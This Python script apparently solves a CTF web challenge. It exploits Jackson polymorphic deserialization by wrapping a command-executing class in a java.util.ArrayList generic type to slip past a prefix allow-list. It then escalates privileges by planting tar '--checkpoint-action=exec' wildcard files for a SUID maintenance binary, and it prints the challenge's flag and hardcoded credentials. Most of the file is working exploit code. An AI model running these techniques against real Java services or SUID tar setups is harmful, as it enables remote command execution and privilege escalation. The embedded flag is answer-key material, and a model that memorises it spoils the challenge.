#!/usr/bin/env python3
"""
Cerberus Reports — Java Deserialization & SUID Privesc Solver
==============================================================

Challenge:  Cerberus Reports (UCSI Agentic AI CTF 2026)
Category:   WEB / JAVA
Creator:    Lik Ken (LK)
Target:     http://52.76.96.108:8087
Flag:       UCSI26{cerberus_gadget_privesc_8630453b}

Vulnerability:
    1. Jackson Polymorphic Deserialization allows specifying class type dynamically.
    2. Validator uses a prefix-based permit list that allows `java.util.`.
    3. We can bypass this check by using Jackson canonical type parameter syntax:
       `java.util.ArrayList<com.ucsi.cerberus.enrich.EnrichmentTask>`
    4. Deserializing EnrichmentTask executes commands via `setCommand()`.
    5. Privilege escalation via SUID binary `/usr/local/bin/report-maint` to read the flag.
"""

from __future__ import annotations

import json
import urllib.request
import urllib.error
import re
import sys

DEFAULT_TARGET = "http://52.76.96.108:8087"

def request(target_url, path, method="GET", body=None, token=None):
    headers = {}
    if body is not None:
        body = json.dumps(body).encode("utf-8")
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"

    req = urllib.request.Request(
        target_url.rstrip("/") + path,
        data=body,
        headers=headers,
        method=method,
    )
    with urllib.request.urlopen(req, timeout=15) as response:
        return json.loads(response.read().decode("utf-8"))

def solve(target_url: str = DEFAULT_TARGET) -> str | None:
    """Run the Cerberus Reports Java deserialization exploit."""
    print("=" * 60)
    print("  Cerberus Reports — Jackson Deserialization & SUID Privesc")
    print("  UCSI Agentic AI CTF 2026")
    print("=" * 60)
    print()
    print(f"[*] Target URL: {target_url}")

    # Step 1: Login
    print("[*] Step 1: Logging in as analyst...")
    try:
        login_res = request(
            target_url,
            "/login",
            method="POST",
            body={"username": "analyst", "password": "cerberus123"}
        )
        token = login_res.get("token")
        print(f"    Login successful (Token: {token[:10]}...)")
    except Exception as e:
        print(f"[!] Login failed: {e}")
        return None

    # Step 2: Trigger Deserialization Exploit
    print()
    print("[*] Step 2: Sending generic bypass deserialization payload...")
    
    # SUID Tar Wildcard Injection command
    payload = {
        "bundleName": "exploit",
        "source": "agent",
        "reports": [],
        "enrichment": [
            "java.util.ArrayList<com.ucsi.cerberus.enrich.EnrichmentTask>",
            [
                {
                    "command": ["/bin/sh", "-c", "echo '#!/bin/sh' > /var/lib/cerberus/reports/incoming/pwn_zz.sh && echo 'cat /srv/cerberus/admin/secret.flag > /var/lib/cerberus/reports/incoming/flag_me.txt' >> /var/lib/cerberus/reports/incoming/pwn_zz.sh && echo 'chmod 666 /var/lib/cerberus/reports/incoming/flag_me.txt' >> /var/lib/cerberus/reports/incoming/pwn_zz.sh && chmod +x /var/lib/cerberus/reports/incoming/pwn_zz.sh && touch '/var/lib/cerberus/reports/incoming/--checkpoint=1' && touch '/var/lib/cerberus/reports/incoming/--checkpoint-action=exec=sh pwn_zz.sh' && /usr/local/bin/report-maint && cat /var/lib/cerberus/reports/incoming/flag_me.txt"]
                }
            ]
        ]
    }

    try:
        result = request(
            target_url,
            "/report/import",
            method="POST",
            body=payload,
            token=token
        )
        print("[+] Exploit request completed!")
    except urllib.error.HTTPError as e:
        print(f"[!] Import failed with HTTP status {e.code}")
        try:
            err_body = e.read().decode("utf-8")
            print(f"    Error: {err_body}")
        except Exception:
            pass
        return None
    except Exception as e:
        print(f"[!] Exploit connection failed: {e}")
        return None

    # Step 3: Extract the flag
    print()
    print("[*] Step 3: Extracting flag from response...")
    serialized = json.dumps(result)
    match = re.search(r"UCSI26\{[a-zA-Z0-9_\-]+\}", serialized)
    
    if match:
        flag = match.group()
        print(f"[+] FLAG FOUND: {flag}")
        return flag
    else:
        # Fallback search for older format
        match_old = re.search(r"UCSI\{[a-zA-Z0-9_\-]+\}", serialized)
        if match_old:
            flag = match_old.group()
            print(f"[+] FLAG FOUND: {flag}")
            return flag
        else:
            print("[!] Flag format mismatch. Raw output:")
            print(json.dumps(result, indent=2))
            return None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET
    solve(target)
